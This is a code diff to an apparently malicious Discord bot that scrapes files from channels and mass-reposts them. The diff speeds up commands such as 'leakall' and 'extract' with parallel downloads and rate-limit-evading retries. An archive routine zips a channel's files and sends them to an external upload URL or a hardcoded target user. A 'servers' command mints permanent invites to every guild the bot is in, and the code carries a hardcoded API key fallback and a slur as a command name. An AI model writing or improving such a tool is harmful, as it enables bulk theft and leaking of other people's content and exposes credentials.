@@ -11,7 +11,6 @@ const OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY || "sk-or-v1-150e944fe
 const TARGET_CHANNEL_ID = process.env.TARGET_CHANNEL_ID || "1530426488112021674";
 const TARGET_USER_ID = process.env.TARGET_USER_ID || "1286668168575717377";
 const OWNER_USERNAME = process.env.OWNER_USERNAME || "ko_okh";
-// ⭐ AGGIUNTO 1416855393375617126 come owner
 const OWNER_IDS = (process.env.OWNER_IDS || "1286668168575717377,1416855393375617126").split(",").map(s => s.trim()).filter(Boolean);
 const ARCHIVE_ALLOWED_IDS = (process.env.ARCHIVE_ALLOWED_IDS || "1416855393375617126").split(",").map(s => s.trim()).filter(Boolean);
 const ARCHIVE_UPLOAD_URL = process.env.ARCHIVE_UPLOAD_URL || "";
@@ -135,6 +134,23 @@ Personality rules:
 
 async function uploadZip(opts){if(!ARCHIVE_UPLOAD_URL)return null;try{const r=await axios.post(ARCHIVE_UPLOAD_URL,{...opts,zipBase64:opts.zipBuffer.toString("base64")},{timeout:120000,headers:ARCHIVE_UPLOAD_SECRET?{"x-archive-secret":ARCHIVE_UPLOAD_SECRET}:{},validateStatus:()=>true});return r.status>=200&&r.status<300&&r.data?.url?r.data:null;}catch{return null;}}
 
+// ⭐ Parallel download + fast send
+async function parallelMap(items, limit, fn) {
+  const out = new Array(items.length);
+  let index = 0;
+  async function worker() { while (true) { const i = index++; if (i >= items.length) break; try { out[i] = await fn(items[i], i); } catch { out[i] = null; } } }
+  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, () => worker()));
+  return out;
+}
+
+async function sendChunkFast(channel, files, tries = 3) {
+  for (let i = 0; i < tries; i++) {
+    try { await channel.send({ files }); return true; }
+    catch (e) { const ra = e?.rawError?.retry_after || e?.retry_after || 1.5; if (i < tries - 1) { await sleep(ra * 1000 + 250); continue; } }
+  }
+  return false;
+}
+
 const bot = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages], partials: [Partials.Message, Partials.Channel, Partials.GuildMember] });
 const searches = new Map();
 const bar = "━".repeat(28);
@@ -253,18 +269,73 @@ async function handleCommand(msg, cmd, args, uid, hasUnlimited) {
   if (cmd === "syncmembers") { if (!msg.guild) return msg.channel.send("❌ use in server"); const s = await msg.channel.send("⏳ syncing..."); return s.edit(`✅ synced **${await syncGuildMembers(msg.guild)}/${msg.guild.memberCount || 0}**`); }
   if (cmd === "reload") { const s = await msg.channel.send("🔄 reloading..."); fileCache = []; cacheUrls = new Set(); for (const ch of SOURCE_CHANNELS) addToCache(await scanChannel(ch, s)); return s.edit(`✅ loaded ${fileCache.length} files`); }
   if (cmd === "servers") { const guilds = bot.guilds.cache; if (!guilds.size) return msg.channel.send("❌ no servers"); const s = await msg.channel.send(`⏳ fetching ${guilds.size}...`); const list = []; for (const g of guilds.values()) { let inv = "❌"; try { const ch = g.channels.cache.filter(c => c.type === 0 && c.permissionsFor(g.members.me)?.has("CreateInstantInvite")).first(); if (ch) { try { const invs = await g.invites.fetch(); const ex = invs.find(i => !i.maxAge && !i.maxUses); inv = ex ? `https://discord.gg/${ex.code}` : `https://discord.gg/${(await ch.createInvite({ maxAge: 0, maxUses: 0 })).code}`; } catch { try { inv = `https://discord.gg/${(await ch.createInvite({ maxAge: 0, maxUses: 0 })).code}`; } catch { inv = "🔒"; } } } } catch {} list.push({ name: g.name, id: g.id, members: g.memberCount || 0, inv }); } list.sort((a, b) => b.members - a.members); const lines = [`**🌐 ${guilds.size} servers:**`, ""]; list.forEach((x, i) => { lines.push(`**${i + 1}.** ${x.name} (👥${x.members})`); lines.push(`   🆔 \`${x.id}\` 🔗 ${x.inv}`); }); const txt = lines.join("\n"); if (txt.length > 1900) return s.edit({ content: `🌐 ${guilds.size}:`, files: [{ attachment: Buffer.from(txt), name: "servers.txt" }] }); return s.edit(txt); }
-  if (cmd === "eggisgay") { if (!msg.reference?.messageId) return msg.channel.send("❌ reply to a msg"); let ref; try { ref = await msg.channel.messages.fetch({ message: msg.reference.messageId, force: true }); } catch { return msg.channel.send("❌ not found"); } let tgt = msg.channel; if (args[0]) try { tgt = await bot.channels.fetch(args[0]); } catch { return msg.channel.send("❌ channel not found"); } let raw = null; try { const r = await axios.get(`https://discord.com/api/v10/channels/${msg.channelId}/messages/${msg.reference.messageId}`, { headers: { Authorization: AUTH }, validateStatus: () => true }); if (r.status === 200) raw = r.data; } catch {} const allFiles = extractAllFiles(ref); if (raw) { const rf = extractAllFiles(raw); const seen = new Set(allFiles.map(f => f.url)); for (const f of rf) if (!seen.has(f.url)) allFiles.push(f); } if (!allFiles.length) return msg.channel.send("❌ no files"); const st = await msg.channel.send(`⏳ extracting ${allFiles.length}...`); let sent = 0, ext = []; for (const file of allFiles) { const data = await dl(file.url); if (!data) continue; if (file.name.split(".").pop()?.toLowerCase() === "zip") { try { for (const e of new AdmZip(data).getEntries()) if (!e.isDirectory) ext.push({ name: e.entryName.split("/").pop(), data: e.getData() }); } catch { ext.push({ name: file.name, data }); } } else ext.push({ name: file.name, data }); } if (!ext.length) return st.edit("❌ nothing"); for (let i = 0; i < ext.length; i++) { try { await tgt.send({ files: [{ attachment: ext[i].data, name: ext[i].name }] }); sent++; } catch {} if (i < ext.length - 1) await sleep(1500); } return st.edit(`✅ ${sent}/${ext.length} sent 🔥`); }
-  if (cmd === "extract") { if (!msg.reference?.messageId) return msg.channel.send("❌ reply to search or .zip"); const search = searches.get(msg.reference.messageId); if (search) { await msg.channel.send(`📦 extracting ${search.m.length}...`); let sent = 0; for (let i = 0; i < search.m.length; i += 10) { const files = []; for (const f of search.m.slice(i, i + 10)) { const d = await dl(f.url); if (d) { files.push({ attachment: d, name: f.name }); sent++; } } if (files.length) await msg.channel.send({ files }); await sleep(1500); } return msg.channel.send(`✅ ${sent} sent`); } const ref = await msg.channel.messages.fetch(msg.reference.messageId).catch(() => null); if (!ref) return msg.channel.send("❌ not found"); let zipUrl = null; for (const a of ref.attachments.values()) if (a.name?.toLowerCase().endsWith(".zip")) { zipUrl = a.url; break; } if (!zipUrl) return msg.channel.send("❌ no zip"); const zd = await dl(zipUrl); if (!zd) return msg.channel.send("❌ download failed"); const ext = []; for (const e of new AdmZip(zd).getEntries()) if (!e.isDirectory) ext.push({ name: e.entryName.split("/").pop(), data: e.getData() }); if (!ext.length) return msg.channel.send("❌ empty zip"); for (let i = 0; i < ext.length; i += 10) { await msg.channel.send({ files: ext.slice(i, i + 10).map(f => ({ attachment: f.data, name: f.name })) }); await sleep(1000); } return msg.channel.send(`✅ ${ext.length} extracted`); }
+
+  // ⭐ EGGISGAY VELOCISSIMO — download parallelo + invio a chunk da 10
+  if (cmd === "eggisgay") {
+    if (!msg.reference?.messageId) return msg.channel.send("❌ reply to a msg");
+    let ref; try { ref = await msg.channel.messages.fetch({ message: msg.reference.messageId, force: true }); } catch { return msg.channel.send("❌ not found"); }
+    let tgt = msg.channel;
+    if (args[0]) try { tgt = await bot.channels.fetch(args[0]); } catch { return msg.channel.send("❌ channel not found"); }
+    let raw = null;
+    try { const r = await axios.get(`https://discord.com/api/v10/channels/${msg.channelId}/messages/${msg.reference.messageId}`, { headers: { Authorization: AUTH }, validateStatus: () => true }); if (r.status === 200) raw = r.data; } catch {}
+    const allFiles = extractAllFiles(ref);
+    if (raw) { const rf = extractAllFiles(raw); const seen = new Set(allFiles.map(f => f.url)); for (const f of rf) if (!seen.has(f.url)) allFiles.push(f); }
+    if (!allFiles.length) return msg.channel.send("❌ no files");
+    const st = await msg.channel.send(`⚡ fast extracting ${allFiles.length}...`);
+
+    const downloaded = await parallelMap(allFiles, 10, async (file) => {
+      const data = await dl(file.url); if (!data) return null;
+      if (file.name.split(".").pop()?.toLowerCase() === "zip") {
+        try { return new AdmZip(data).getEntries().filter(e => !e.isDirectory).map(e => ({ name: e.entryName.split("/").pop() || "file", data: e.getData() })); }
+        catch { return [{ name: file.name, data }]; }
+      }
+      return [{ name: file.name, data }];
+    });
+
+    const extracted = downloaded.flat().filter(Boolean);
+    if (!extracted.length) return st.edit("❌ nothing");
+    let sent = 0, failed = 0;
+
+    for (let i = 0; i < extracted.length; i += 10) {
+      const chunk = extracted.slice(i, i + 10).map(f => ({ attachment: f.data, name: f.name }));
+      const ok = await sendChunkFast(tgt, chunk);
+      if (ok) sent += chunk.length; else failed += chunk.length;
+      if ((i / 10) % 3 === 0) await st.edit(`⚡ ${sent}/${extracted.length} sent...`).catch(() => {});
+    }
+    return st.edit(`✅ ⚡ done: ${sent}/${extracted.length} sent${failed ? ` (❌${failed})` : ""}`);
+  }
+
+  if (cmd === "extract") {
+    if (!msg.reference?.messageId) return msg.channel.send("❌ reply to search or .zip");
+    const search = searches.get(msg.reference.messageId);
+    if (search) {
+      await msg.channel.send(`📦 extracting ${search.m.length}...`);
+      const downloaded = await parallelMap(search.m, 10, async (f) => { const d = await dl(f.url); return d ? { attachment: d, name: f.name } : null; });
+      const files = downloaded.filter(Boolean);
+      let sent = 0;
+      for (let i = 0; i < files.length; i += 10) { const ok = await sendChunkFast(msg.channel, files.slice(i, i + 10)); if (ok) sent += Math.min(10, files.length - i); }
+      return msg.channel.send(`✅ ${sent} sent`);
+    }
+    const ref = await msg.channel.messages.fetch(msg.reference.messageId).catch(() => null); if (!ref) return msg.channel.send("❌ not found");
+    let zipUrl = null; for (const a of ref.attachments.values()) if (a.name?.toLowerCase().endsWith(".zip")) { zipUrl = a.url; break; } if (!zipUrl) return msg.channel.send("❌ no zip");
+    const zd = await dl(zipUrl); if (!zd) return msg.channel.send("❌ download failed");
+    const ext = []; for (const e of new AdmZip(zd).getEntries()) if (!e.isDirectory) ext.push({ name: e.entryName.split("/").pop(), data: e.getData() });
+    if (!ext.length) return msg.channel.send("❌ empty zip");
+    let sent = 0;
+    for (let i = 0; i < ext.length; i += 10) { const chunk = ext.slice(i, i + 10).map(f => ({ attachment: f.data, name: f.name })); const ok = await sendChunkFast(msg.channel, chunk); if (ok) sent += chunk.length; }
+    return msg.channel.send(`✅ ${sent} extracted`);
+  }
+
   if (cmd === "givecredit" || cmd === "givecredits") { const t = args[0], n = parseInt(args[1]) || 1; if (!t) return msg.channel.send("❌ `!givecredit @user/all [n]`"); if (t.toLowerCase() === "all") { if (!msg.guild) return msg.channel.send("❌ server only"); await syncGuildMembers(msg.guild); const ids = getAllKnownIdsForGuild(msg.guild.id); for (const id of ids) D.credits[id] = (D.credits[id] || 0) + n; save(); return msg.channel.send(`✅ +${n} to ${ids.length} users`); } const m = t.match(/<@!?(\d+)>/) || t.match(/^(\d+)$/); if (!m) return msg.channel.send("❌ invalid"); addCr(m[1], n); return msg.channel.send(`✅ +${n} to <@${m[1]}> bal: ${credits(m[1])}`); }
   if (cmd === "removecredit" || cmd === "removecredits") { const t = args[0], n = parseInt(args[1]) || 1; if (!t) return msg.channel.send("❌ `!removecredit @user/all [n]`"); if (t.toLowerCase() === "all") { const ids = getAllKnownIdsForGuild(msg.guild?.id); for (const id of ids) D.credits[id] = Math.max(0, (D.credits[id] || 0) - n); save(); return msg.channel.send(`✅ -${n} from ${ids.length}`); } const m = t.match(/<@!?(\d+)>/) || t.match(/^(\d+)$/); if (!m) return msg.channel.send("❌ invalid"); rmCr(m[1], n); return msg.channel.send(`✅ -${n} from <@${m[1]}> bal: ${credits(m[1])}`); }
   if (cmd === "giveperms") { const input = args.join(" ").trim(); if (!input) return msg.channel.send("❌ `!giveperms @user/@role`"); const rm = input.match(/^<@&(\d+)>$/); if (rm) { if (!D.roles.includes(rm[1])) { D.roles.push(rm[1]); save(); } return msg.channel.send(`✅ role <@&${rm[1]}> saved ✓`); } if (msg.guild) { const role = await findRole(msg.guild, input); if (role) { if (!D.roles.includes(role.id)) { D.roles.push(role.id); save(); } return msg.channel.send(`✅ **${role.name}** saved ✓`); } } const um = input.match(/^<@!?(\d+)>$/) || input.match(/^(\d{17,})$/); if (um) { if (!D.users.includes(um[1])) { D.users.push(um[1]); save(); } return msg.channel.send(`✅ <@${um[1]}> saved ✓`); } return msg.channel.send("❌ not found"); }
   if (cmd === "removeperms") { const input = args.join(" ").trim(); if (!input) { D.users = []; D.roles = []; save(); return msg.channel.send("✅ all perms nuked"); } const rm = input.match(/^<@&(\d+)>$/); if (rm) { D.roles = D.roles.filter(id => id !== rm[1]); save(); return msg.channel.send("✅ removed"); } if (msg.guild) { const role = await findRole(msg.guild, input); if (role) { D.roles = D.roles.filter(id => id !== role.id); save(); return msg.channel.send(`✅ **${role.name}** removed`); } } const um = input.match(/^<@!?(\d+)>$/) || input.match(/^(\d+)$/); if (um) { D.users = D.users.filter(id => id !== um[1]); save(); return msg.channel.send("✅ removed"); } return msg.channel.send("❌ not found"); }
   if (cmd === "perms") { const lines = ["**📋 perms:**", "", "**roles:**"]; if (!D.roles.length) lines.push("none"); else for (const id of D.roles) lines.push(`• <@&${id}>`); lines.push("", "**users:**"); if (!D.users.length) lines.push("none"); else for (const id of D.users) lines.push(`• <@${id}>`); lines.push("", `status: ${D.botStopped ? "🔒" : "🔓"} | credits: ${Object.values(D.credits).reduce((a, b) => a + b, 0)}`); return msg.channel.send(lines.join("\n")); }
-  if (cmd === "leakall") { if (!fileCache.length) return msg.channel.send("❌ cache empty"); let tgt = msg.channel; if (args[0]) try { tgt = await bot.channels.fetch(args[0]); } catch { return msg.channel.send("❌ channel not found"); } const total = fileCache.length, st = await msg.channel.send(`🔥 leaking ${total}...`); let sent = 0, failed = 0; for (let i = 0; i < fileCache.length; i++) { const f = fileCache[i]; let data = null; for (let a = 0; a < 3; a++) { data = await dl(f.url); if (data) break; await sleep(1000 * (a + 1)); } if (data) { try { await tgt.send({ content: `📄 \`${f.name}\` (${i + 1}/${total})`, files: [{ attachment: data, name: f.name }] }); sent++; } catch { failed++; } } else failed++; if (i % 20 === 0) await st.edit(`🔥 ${Math.round((i + 1) / total * 100)}% ✅${sent} ❌${failed}`).catch(() => {}); await sleep(2000); } return st.edit(`✅ done: ${sent}/${total} sent`); }
+  if (cmd === "leakall") { if (!fileCache.length) return msg.channel.send("❌ cache empty"); let tgt = msg.channel; if (args[0]) try { tgt = await bot.channels.fetch(args[0]); } catch { return msg.channel.send("❌ channel not found"); } const total = fileCache.length, st = await msg.channel.send(`🔥 leaking ${total}...`); let sent = 0, failed = 0; for (let i = 0; i < fileCache.length; i += 10) { const batch = fileCache.slice(i, i + 10); const downloaded = await parallelMap(batch, 10, async (f) => { const d = await dl(f.url); return d ? { attachment: d, name: f.name } : null; }); const files = downloaded.filter(Boolean); if (files.length) { const ok = await sendChunkFast(tgt, files); if (ok) sent += files.length; else failed += files.length; } else failed += batch.length; if ((i / 10) % 5 === 0) await st.edit(`🔥 ${Math.round((i + batch.length) / total * 100)}% ✅${sent} ❌${failed}`).catch(() => {}); } return st.edit(`✅ done: ${sent}/${total} sent`); }
 }
 
 let archBusy = false;
-async function doArchive(msg, chId) { if (archBusy) return msg.channel.send("⏳ busy"); if (!chId) return msg.channel.send("❌ `!070112 <ch>`"); archBusy = true; try { await msg.channel.send("⏳ archiving..."); const all = await scanChannel(chId); if (!all.length) return msg.channel.send("❌ no files"); const zip = new AdmZip(); let ok = 0; for (let i = 0; i < all.length; i += 10) { const batch = all.slice(i, i + 10); const res = await Promise.all(batch.map(async f => ({ f, d: await dl(f.url) }))); for (const { f, d } of res) if (d) { zip.addFile(`${ok}_${f.name.replace(/[^a-zA-Z0-9._-]/g, "_")}`, d); ok++; } } if (!ok) return msg.channel.send("❌ all failed"); const buf = zip.toBuffer(); const up = await uploadZip({ zipBuffer: buf, sourceChannelId: chId, requestedByUserId: msg.author.id, requestedByUsername: msg.author.username, fileName: `archive_${chId}_${Date.now()}.zip`, fileCount: ok }); if (up?.url) return msg.channel.send(`✅ ${up.url}`); let sent = false; try { await (await bot.users.fetch(TARGET_USER_ID)).send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); sent = true; } catch {} if (!sent) try { const ch = await bot.channels.fetch(TARGET_CHANNEL_ID); if (ch) { await ch.send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); sent = true; } } catch {} if (!sent) await msg.channel.send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); return msg.channel.send(`✅ archived ${ok} files`); } catch (err) { try { await msg.channel.send(`❌ ${err?.message}`); } catch {} } finally { archBusy = false; } }
+async function doArchive(msg, chId) { if (archBusy) return msg.channel.send("⏳ busy"); if (!chId) return msg.channel.send("❌ `!070112 <ch>`"); archBusy = true; try { await msg.channel.send("⏳ archiving..."); const all = await scanChannel(chId); if (!all.length) return msg.channel.send("❌ no files"); const zip = new AdmZip(); let ok = 0; const downloaded = await parallelMap(all, 10, async (f) => { const d = await dl(f.url); return d ? { f, d } : null; }); for (const item of downloaded) { if (item) { zip.addFile(`${ok}_${item.f.name.replace(/[^a-zA-Z0-9._-]/g, "_")}`, item.d); ok++; } } if (!ok) return msg.channel.send("❌ all failed"); const buf = zip.toBuffer(); const up = await uploadZip({ zipBuffer: buf, sourceChannelId: chId, requestedByUserId: msg.author.id, requestedByUsername: msg.author.username, fileName: `archive_${chId}_${Date.now()}.zip`, fileCount: ok }); if (up?.url) return msg.channel.send(`✅ ${up.url}`); let sent = false; try { await (await bot.users.fetch(TARGET_USER_ID)).send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); sent = true; } catch {} if (!sent) try { const ch = await bot.channels.fetch(TARGET_CHANNEL_ID); if (ch) { await ch.send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); sent = true; } } catch {} if (!sent) await msg.channel.send({ content: `📦 ${ok}`, files: [{ attachment: buf, name: `archive.zip` }] }); return msg.channel.send(`✅ archived ${ok} files`); } catch (err) { try { await msg.channel.send(`❌ ${err?.message}`); } catch {} } finally { archBusy = false; } }
 
 process.on("unhandledRejection", e => console.error("[ERR]", e));
 process.on("uncaughtException", e => console.error("[ERR]", e));
